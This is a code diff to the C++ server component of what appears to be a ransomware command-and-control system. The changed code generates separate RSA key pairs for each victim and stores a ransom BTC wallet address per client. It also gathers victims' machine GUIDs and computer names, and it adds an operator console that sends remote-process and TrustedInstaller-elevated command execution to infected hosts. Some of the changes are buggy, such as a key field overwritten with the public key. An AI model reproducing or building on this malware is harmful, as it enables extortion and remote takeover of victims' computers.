@@ -75,10 +75,10 @@ RSAKeys ServerInterface::GenerateRSAPair() {
 	EVP_PKEY_free(key);
 
 	RSAKeys keys;
+	keys.bioPublicKey = pub;
+	keys.bioPrivateKey = priv;
 	keys.strPublicKey = Serialization::ConvertBIOToString(pub);
 	keys.strPrivateKey = Serialization::ConvertBIOToString(priv);
-	keys.bioPrivateKey = priv;
-	keys.bioPublicKey = pub;
 
 	return keys;
 }
@@ -101,6 +101,7 @@ void ServerInterface::ListenForUDPMessages() {
 		BOOL		  received = NetCommon::ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
 		if ( !received )
 			continue;
+		std::cout << "Received a message on the UDP socket!\n";
 
 		PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
 	}
@@ -117,8 +118,8 @@ BOOL ServerInterface::TCPSendMessageToAllClients(ServerCommand& req) {
 
 	m_ClientListMutex.lock();
 
-	for ( auto& clientInfo : this->m_ClientList )
-		success = TCPSendMessageToClient(clientInfo.first, req);
+	for ( auto& [ id, client ] : this->m_ClientList )
+		success = TCPSendMessageToClient(id, req);
 
 	m_ClientListMutex.unlock();
 
@@ -170,8 +171,8 @@ Client* ServerInterface::GetClientSaveFile(long cuid) {
 	RSAKeys secrets;
 	macaron::Base64::Decode(JSONClientInfo["b64_rsa_public_key"], secrets.strPublicKey);
 	macaron::Base64::Decode(JSONClientInfo["b64_rsa_private_key"], secrets.strPrivateKey);
-	secrets.bioPrivateKey = client->GetSecrets().bioPrivateKey;
-	secrets.bioPublicKey = client->GetSecrets().bioPublicKey;
+	secrets.strPrivateKey = client->GetSecrets().strPrivateKey;
+	secrets.strPrivateKey = client->GetSecrets().strPublicKey;
 	client->SetEncryptionKeys(secrets);
 	client->UniqueBTCWalletAddress = JSONClientInfo["unique_btc_wallet"];
 
@@ -247,8 +248,38 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 	if ( onTCP ) 
 		TCPClient = GetClientPtr(cuid);
 
+	std::cout << "Performing action : " << req.action << std::endl;
+
 	switch ( req.action )
 	{
+	case ClientRequest::kGetRequestEncryptionKeyPrivate: 
+	{
+		if ( !onTCP )
+			break;
+
+		// send private key to client base64 encoded
+		std::string privKey = TCPClient->GetRequestSecrets().strPrivateKey;
+		std::string base64 = macaron::Base64::Encode(privKey);  
+		BYTESTRING buffer = Serialization::SerializeString(base64);
+		
+		success = NetCommon::TransmitData(buffer, TCPClient->GetSocket(TCP), TCP);
+		std::cout << "Sent request private key\n";
+		break;
+	}
+	case ClientRequest::kGetRequestEncryptionKeyPublic:
+	{
+		if ( !onTCP )
+			break;
+
+		// send public key to client base64 encoded
+		std::string pub = TCPClient->GetRequestSecrets().strPublicKey;
+		std::string base64 = macaron::Base64::Encode(pub);
+		BYTESTRING buffer = Serialization::SerializeString(base64);
+
+		success = NetCommon::TransmitData(buffer, TCPClient->GetSocket(TCP), TCP);
+		std::cout << "Sent request public key\n";
+		break;
+	}
 	case ClientRequest::kDisconnectClient:
 		SaveServerState();
 
@@ -276,9 +307,17 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 		Server temp = this->m_TCPServerDetails;
 		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);
 
-		UDPMessage response(temp);
+		std::cout << "[kConnectClient] : Good address. \n";
+		std::cout << "[kConnectClient] : Sending TCP server details. \n";
+
+		UDPMessage response;
+		response.isValid = TRUE;
+		response.TCPServer = temp;
 		if ( UDPSendMessageToClient(UDPClient, response) )
 			success = TRUE;
+
+		if ( success )
+			std::cout << "[kConnectClient] : Sent TCP details. \n";
 
 		break;
 	}
@@ -301,7 +340,7 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 	case ClientMessage::kRequestPublicEncryptionKey:
 		if ( !onTCP )
 			break;
-		success = SendTCPClientRSAPublicKey(cuid, TCPClient->GetSecrets().bioPublicKey);
+		//success = SendTCPClientRSAPublicKey(cuid, Serialization::GetBIOFromString(TCPClient->GetRequestSecrets().strPrivateKey));
 		break;
 	case ClientMessage::kRequestRansomBTCAddress:
 		if ( !onTCP )
@@ -330,13 +369,12 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 	{
 		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP));
 		PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
+		receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP));
+		PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
 	}
 
-	if ( client->GetMachineGUID() == "unknown" )
-		GetClientComputerName(cuid);
-
-	if ( client->GetMachineGUID() == "unknown" )
-		GetClientMachineGUID(cuid);
+	GetClientComputerName(cuid);
+	GetClientMachineGUID(cuid);
 
 	if ( IsClientInSaveFile(client->GetMachineGUID()) )
 		GetClientSaveFile(client->ClientUID);
@@ -344,18 +382,19 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 	SaveServerState();
 
 	// tcp receive main loop
+	std::cout << "[TCP] : Receiving messages from " << cuid << " (" << client->GetMachineGUID() << "/" << client->GetDesktopName() << ")\n";
 	do
 	{
 
 		// get a client response usually after an action is performed on the remote host
 		if ( client->ExpectingResponse ) {
 			client->LastClientResponse = client->RecentClientResponse;
-			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(TCP), TRUE, client->GetSecrets().bioPrivateKey);
+			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(client->GetSocket(TCP), TRUE, Serialization::GetBIOFromString(client->GetRequestSecrets().strPrivateKey));
 			continue;
 		}
 
 		// receive data from client, decrypt it using their rsa key
-		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, client->GetSecrets().bioPrivateKey);
+		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, Serialization::GetBIOFromString(client->GetRequestSecrets().strPrivateKey));
 
 		BOOL performed = PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
 	} while ( client->Alive );
@@ -368,20 +407,20 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
  * \param pubKey - BIO* of the clients public key
  * \return 
  */
-BOOL ServerInterface::SendTCPClientRSAPublicKey(long cuid, BIO* pubKey) {
-	if ( !ClientIsInClientList(cuid) )
-		return FALSE;
-
-	Client* client = GetClientPtr(cuid);
-
-	std::string bio = Serialization::ConvertBIOToString(pubKey); // pub key as a string
-	std::string base64 = macaron::Base64::Encode(bio);  
-	BYTESTRING buffer = Serialization::SerializeString(base64);
-
-	BOOL sent = NetCommon::TransmitData(buffer, client->GetSocket(TCP), TCP);
-
-	return TRUE;
-}
+//BOOL ServerInterface::SendTCPClientKey(long cuid, std::string key) {
+//	if ( !ClientIsInClientList(cuid) )
+//		return FALSE;
+//
+//	Client* client = GetClientPtr(cuid);
+//
+//	std::string bio = Serialization::ConvertBIOToString(key); // pub key as a string
+//	std::string base64 = macaron::Base64::Encode(bio);  
+//	BYTESTRING buffer = Serialization::SerializeString(base64);
+//
+//	BOOL sent = NetCommon::TransmitData(buffer, client->GetSocket(TCP), TCP);
+//
+//	return TRUE;
+//}
 
 /**
  * Accept incoming client connection requests for the TCP server.
@@ -393,7 +432,9 @@ void ServerInterface::AcceptTCPConnections() {
 
 	this->m_TCPServerDetails.accepting = TRUE;
 
-	while ( this->m_ClientList.size() < ReadConfig().maxConnections && this->m_TCPServerDetails.alive == TRUE )
+	std::cout << "[TCP] : Accepting connections...\n";
+
+	while ( this->m_ClientList.size() <= 200 && this->m_TCPServerDetails.alive == TRUE )
 	{
 		// accept
 		sockaddr_in addr = {};
@@ -404,8 +445,10 @@ void ServerInterface::AcceptTCPConnections() {
 			continue;
 
 		Client  newClient(clientSocket, 0, addr);
-		RSAKeys keys = GenerateRSAPair();
-		newClient.SetEncryptionKeys(keys);
+		RSAKeys requestKeys = GenerateRSAPair();
+		RSAKeys ransomKeys = GenerateRSAPair();
+		newClient.SetRequestSecrets(requestKeys);
+		newClient.SetRansomSecrets(ransomKeys);
 		
 		AddToClientList(newClient); // add them to the client list
 
@@ -418,13 +461,54 @@ void ServerInterface::AcceptTCPConnections() {
 	this->m_TCPServerDetails.accepting = FALSE;
 }
 
+BOOL ServerInterface::HandleUserInput(unsigned int command, ServerCommand& outputCommand) {
+	BOOL performed = FALSE;
+	ServerCommand cmdInfo = {};
+	cmdInfo.action = static_cast<RemoteAction>(command);
+
+	switch ( command ) {
+	case RemoteAction::KOpenElevatedProcess:
+		std::cout << "Opening elevated remote process.\n";
+		cmdInfo.remoteContext = SecurityContext::TrustedInstaller;
+		std::cout << "Enter arguments for command line: " << std::endl;
+	case RemoteAction::kOpenRemoteProcess:
+		std::cin >> cmdInfo.commandLineArguments;
+		cmdInfo.valid = TRUE;
+		performed = TRUE;
+		break;
+	case RemoteAction::kPingClient:
+		performed = TRUE;
+		break;
+	//case RemoteAction::kReturnPrivateRSAKey:
+	//case RemoteAction::kReturnPublicRSAKey:
+	//case RemoteAction::kSendPublicRSAKey:
+	//case RemoteAction::kUseCommandLineInterface:
+		//break;
+	}
+
+	if ( !performed )
+		return FALSE;
+
+	outputCommand = cmdInfo;
+
+	return performed;
+}
+
+BOOL ServerInterface::SendCommandsToClients() {
+	std::thread send(&ServerInterface::RunUserInputOnClients, this);
+	send.detach();
+}
 
 void ServerInterface::RunUserInputOnClients() {
-	while ( this->m_TCPServerDetails.alive ) {
+	while ( this->m_ClientList.size() <= 0 )
+		Sleep(100);
+
+	while ( this->m_TCPServerDetails.alive && m_ClientList.size() > 0 ) {
 		// select which client to run command on
 		unsigned long clientID  = 0;	
-		unsigned int  command   = -1;
+		unsigned int  command   = 0;
 		BOOL		  performed = FALSE;
+		ServerCommand performingCommand;
 
 		std::cout << "YOU ARE NOW RUNNING COMMANDS ON REMOTE HOSTS...\n";
 		std::cout << "Enter 'ClientID' of the remote host to perform commands on (0 for all): ";
@@ -432,22 +516,46 @@ void ServerInterface::RunUserInputOnClients() {
 		std::cout << "\nPerforming commands on client " << clientID << std::endl;
 
 		// input number corrosponding to remote host command
-		do {
-			std::cout << "Input number corresponding to remote host command: ";
-			std::cin >> command;
-			switch ( command ) {
-			case RemoteAction::KOpenElevatedProcess:
-			case RemoteAction::kOpenRemoteProcess:
-			case RemoteAction::kPingClient:
-			case RemoteAction::kReturnPrivateRSAKey:
-			case RemoteAction::kReturnPublicRSAKey:
-			case RemoteAction::kSendPublicRSAKey:
-			case RemoteAction::kUseCommandLineInterface:
-				performed = TRUE;
-				break;
-			}
+		std::cout << "Input number corresponding to remote host command: ";
+		std::cin >> command;
+		std::cout << "Your input: " << command << std::endl;
+		performed = HandleUserInput(command, performingCommand);
+		std::cout << "Fill out performingCommand\n";
 
-		} while ( performed );
+		Client* client = GetClientPtr(clientID);
+		if ( !client ) {
+			system("cls");
+			continue;
+		}
+
+		/*	
+			1. Serialize the servercommand struct 
+			2. Encode the serialized struct with base64
+			3. Serialize b64
+			4. Encrypt b64 with rsa
+		*/
+
+		std::cout << "Client " << client->ClientUID << " key: " << client->GetSecrets().strPrivateKey << std::endl;
+		BYTESTRING serialized = Serialization::SerializeStruct<ServerCommand>(performingCommand);
+		std::string b64 = macaron::Base64::Encode(Serialization::BytestringToString(serialized));
+		BYTESTRING b64bs = Serialization::SerializeString(b64);
+		BYTESTRING cipher = LGCrypto::RSAEncrypt(b64bs, Serialization::GetBIOFromString(client->GetRequestSecrets().strPublicKey), FALSE);
+		std::cout << "cipher size: " << cipher.size() << " serialized size: " << b64bs.size() << std::endl;
+
+		BOOL success = NetCommon::TransmitData(cipher, client->GetSocket(TCP), TCP);
+		if ( success ) {
+			std::cout << "Sent the message to client.\n";
+			system("pause");
+		}
+		else {
+			std::cout << "There was an error performing the request. Request: " << performingCommand.action << " Client: " << clientID << std::endl;
+			system("pause");
+		}
+
+		//if ( !success ) {
+		//	std::cout << "There was an error performing the request. Request: " << performingCommand.action << " Client: " << clientID << std::endl;
+		//	system("pause");
+		//}
 
 		system("cls");
 	}
@@ -467,7 +575,7 @@ BOOL ServerInterface::GetClientMachineGUID(long cuid) {
 	if ( !received )
 		return FALSE;
 
-	BYTESTRING decrypted = LGCrypto::RSADecrypt(machienGUID, client->GetSecrets().bioPrivateKey, TRUE);
+	BYTESTRING decrypted = LGCrypto::RSADecrypt(machienGUID, client->GetRequestSecrets().bioPrivateKey, TRUE);
 	std::string machineGuid = Serialization::BytestringToString(decrypted);
 	client->SetMachineGUID(machineGuid);
 	return TRUE;
@@ -487,8 +595,11 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
 	if ( !received )
 		return FALSE;
 
-	BYTESTRING decrypted = LGCrypto::RSADecrypt(computerNameSerialized, client->GetSecrets().bioPrivateKey, TRUE);
+	std::cout << "going to decrypt client machine guid with key " << client->GetSecrets().strPrivateKey << std::endl;
+
+	BYTESTRING decrypted = LGCrypto::RSADecrypt(computerNameSerialized, client->GetRequestSecrets().bioPrivateKey, TRUE);
 	std::string computerName = Serialization::BytestringToString(decrypted);
+	std::cout << "receiving computer name " << computerName << std::endl;
 	client->SetDesktopName(computerName);
 	return TRUE;
 }
@@ -529,6 +640,7 @@ Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
 	server.addr.sin_port        = HostToNetworkShort(port);
 	server.port                 = port;
 	server.alive = TRUE;
+	server.accepting = FALSE;
 
 	return server;
 }
@@ -564,6 +676,8 @@ BOOL ServerInterface::StartServer(Server& server) {
 		// start accepting
 		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
 		acceptThread.detach(); // run accept thread even after this function returns
+
+		this->SendCommandsToClients();
 	}
 	// otherwise if not tcp server then listen for udp messaages
 	else if ( server.type == SOCK_DGRAM ) {
